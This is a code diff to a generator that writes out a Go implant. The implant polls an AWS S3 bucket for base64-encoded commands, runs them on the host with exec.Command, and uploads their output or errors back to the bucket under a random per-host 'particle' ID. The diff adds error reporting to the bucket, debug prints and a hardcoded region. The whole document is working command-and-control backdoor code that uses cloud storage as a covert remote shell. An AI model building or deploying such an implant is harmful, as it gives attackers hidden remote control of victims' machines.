@@ -54,39 +54,39 @@ def python_code_generate(bucket, accesskey, secretkey, region, commandkey, outpu
 package main
 
 import (
-	"bytes"
-	"context"
-	"io/ioutil"
+       "bytes"
+       "context"
+       "io/ioutil"
     "encoding/base64"
-
-	"github.com/aws/aws-sdk-go-v2/aws"
+    "fmt"
+       "github.com/aws/aws-sdk-go-v2/aws"
     "github.com/aws/aws-sdk-go-v2/config"
     "github.com/aws/aws-sdk-go-v2/credentials"
     "github.com/aws/aws-sdk-go-v2/service/s3"
     "github.com/aws/aws-sdk-go-v2/service/s3/types"
 
     "os"
-	"math/rand"
-	"time"
-	"os/exec"
-	"strings"
+       "math/rand"
+       "time"
+       "os/exec"
+       "strings"
 )
 
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 var seededRand *rand.Rand = rand.New(
-	rand.NewSource(time.Now().UnixNano()))
+       rand.NewSource(time.Now().UnixNano()))
 
 func StringWithCharset(length int, charset string) string {{
-	b := make([]byte, length)
-	for i := range b {{
-		b[i] = charset[seededRand.Intn(len(charset))]
-	}}
-	return string(b)
+       b := make([]byte, length)
+       for i := range b {{
+        b[i] = charset[seededRand.Intn(len(charset))]
+       }}
+       return string(b)
 }}
 
 func String(length int) string {{
-	return StringWithCharset(length, charset)
+       return StringWithCharset(length, charset)
 }}
 
 func fileExists(filename string) bool {{
@@ -100,14 +100,14 @@ func fileExists(filename string) bool {{
 func decodeBase64(encoded string) (string, error) {{
     decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
     if err != nil {{
-        return "", err
+        fmt.Println(err)
     }}
     return string(decodedBytes), nil
 }}
 
 func main() {{
-    region := "{region}"
-    
+    region := "us-east-1"
+
     accessKey := "{accesskey}"
     secretKey := "{secretkey}"
 
@@ -115,13 +115,13 @@ func main() {{
         config.WithRegion(region),
         config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
     )
-    if err != nil {{}}
+    if err != nil {{fmt.Println(err)}}
 
     s3Client := s3.NewFromConfig(cfg)
 
-	bucket := "{bucket}"
-	key := "{commandkey}"
-	newKey := "{outputkey}"
+       bucket := "{bucket}"
+       key := "{commandkey}"
+       newKey := "{outputkey}"
     kmsKeyID := "{kmskey}"
 
     particlename := ""
@@ -133,14 +133,16 @@ func main() {{
             particlename := String(10)
             f, err := os.Create("./.particle")
             _, err = f.WriteString(particlename)
-            if err != nil{{}}
+            if err != nil{{
+                fmt.Println(err)
+            }}
         }}
 
     }}else {{
         particlename = String(10)
         f, err := os.Create("./.particle")
         _, err = f.WriteString(particlename)
-        if err != nil{{}}
+        if err != nil{{fmt.Println(err)}}
     }}
 
     particlepath := particlename + "/"
@@ -154,6 +156,7 @@ func main() {{
             }})
 
         if err != nil {{
+            fmt.Println(err)
             _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
                 Bucket: aws.String(bucket),
                 Key:    aws.String(particlepath),
@@ -172,19 +175,28 @@ func main() {{
 
             encodedString, err := ioutil.ReadAll(getObjectOutput.Body)
             commandString, err := decodeBase64(string(encodedString))
-            if err != nil {{}}
+            if err != nil {{fmt.Println(err)}}
             if err == nil {{
                 if commandString == "exit_particle_shell"{{
                     break
                 }}
                 commands := strings.Split(commandString, " ")
+                fmt.Println(commandString)
                 command := commands[0]
                 args := commands[1:]
-
+                fmt.Println(commandString)
                 cmd := exec.Command(command, args...)
 
                 output, err := cmd.CombinedOutput()
-                if err != nil {{}}
+                if err != nil {{
+                    _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
+                        Bucket: aws.String(bucket),
+                        Key:    aws.String(particleoutput),
+                        Body:   bytes.NewReader([]byte(err.Error())),
+                        ServerSideEncryption: types.ServerSideEncryptionAwsKms,
+                        SSEKMSKeyId:          aws.String(kmsKeyID),
+                    }})
+                    if err != nil {{fmt.Println(err)}}}}
 
                 if err == nil{{
                     _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
@@ -194,7 +206,7 @@ func main() {{
                         ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                         SSEKMSKeyId:          aws.String(kmsKeyID),
                     }})
-                    if err != nil {{}}
+                    if err != nil {{fmt.Println(err)}}
                 }}
             }}
         }}
